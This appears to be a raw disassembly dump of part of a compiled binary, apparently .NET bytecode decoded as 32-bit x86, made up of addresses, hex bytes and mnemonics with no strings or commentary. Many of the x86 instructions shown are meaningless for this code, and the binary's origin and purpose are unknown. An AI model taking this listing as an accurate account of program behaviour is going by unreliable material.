  402b90:	00 16                	add    %dl,(%esi)
  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
  402b93:	39 00                	cmp    %eax,(%eax)
  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 ac 21 00       	and    $0x21ac72,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 ba                	jb     0x403034
  40307a:	21 00                	and    %eax,(%eax)
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 c4 21 00       	and    $0x21c472,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
  40310d:	00 00                	add    %al,(%eax)
  40310f:	01 1b                	add    %ebx,(%ebx)
  403111:	30 05 00 76 02 00    	xor    %al,0x27600
